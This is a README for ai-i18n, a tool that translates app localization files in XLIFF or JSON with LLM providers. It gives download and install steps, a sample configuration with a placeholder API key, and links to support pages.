# 🎉 ai-i18n - Effortlessly Localize Your App's Content

[![Download ai-i18n](https://img.shields.io/badge/Download-ai--i18n-brightgreen.svg)](https://github.com/Giandev-exe/ai-i18n/releases)

## 🚀 Getting Started

Welcome to ai-i18n! This tool helps you easily translate your app's internationalization (i18n) files using advanced language models. Whether you work with XLIFF or JSON formats, ai-i18n simplifies the process by only translating changed strings.

## 📝 Key Features

- **Supports Multiple LLM Providers**: Use your preferred language model like Anthropic, OpenAI, or Ollama.
- **Works with Various i18n Formats**: Whether you have XLIFF or JSON files, we’ve got you covered.
- **Easy to Setup**: ai-i18n can replace other i18n tools like Lokalise, Phrase, and Crowdin.
- **Automatic Updates**: The tool extracts strings, translates them, and commits back to your repository automatically.

## 💻 System Requirements

To run ai-i18n smoothly, ensure you have:

- A computer with Windows, macOS, or Linux.
- Internet connection to access the LLM providers.
- Git installed (for version control).

## 📦 Download & Install

1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Giandev-exe/ai-i18n/releases) to download the latest version of ai-i18n.
   
2. **Choose Your File**: Locate the file that matches your operating system. Click on it to download.

3. **Extract Files**: After downloading, extract the files if necessary. Most files come in a compressed format (like ZIP).

4. **Run the Application**: Open the folder and run the ai-i18n application. Follow any on-screen instructions to complete the setup.

## 📋 How to Use ai-i18n

After installing ai-i18n, you can start using it to translate your app. Here’s how:

1. **Prepare Your i18n Files**: Make sure your i18n files are ready for translation. They should be in either JSON or XLIFF format.
  
2. **Configure ai-i18n**: Set up the configuration file (typically named `.ai-i18n.json`). Here is a sample layout:
   ```json
   {
     "provider": "openai",
     "api_key": "your_api_key_here",
     "files": ["path/to/your/file.json"],
     "languages": ["en", "es", "fr"]
   }
   ```
   Replace `your_api_key_here` with your actual API key from your chosen LLM provider.

3. **Run the Command**: Open your terminal and navigate to the directory where ai-i18n is located. Use the command:
   ```bash
   ai-i18n run
   ```
   This will start the translation process.

4. **Check Results**: Once the process is complete, check the output files for your translated strings. The changes are committed back to your version control automatically.

## 🤝 Support and Community

If you encounter issues or have questions, feel free to reach out. You can find support through:

- **Issues Page**: Report any bugs or ask questions on our [GitHub Issues page](https://github.com/Giandev-exe/ai-i18n/issues).
- **Community Discussions**: Join discussions with other users to share tips and experiences.

## 🔗 Additional Resources

- **Documentation**: Explore our [full documentation](https://github.com/Giandev-exe/ai-i18n/wiki) for in-depth guides and best practices.
- **Examples**: Check our examples in the repository to see common use cases and configurations.

## 🔊 Feedback and Contributions

Your feedback is vital for improving ai-i18n. If you have suggestions, feel free to contribute or submit a feature request. Contributions are welcome, and guidelines are available in the repository.

## 🌟 Stay Connected

For updates, get involved in the project, and follow our progress, bookmark our releases page: [Releases page](https://github.com/Giandev-exe/ai-i18n/releases).

Thank you for choosing ai-i18n! Enjoy making your app accessible to users around the world!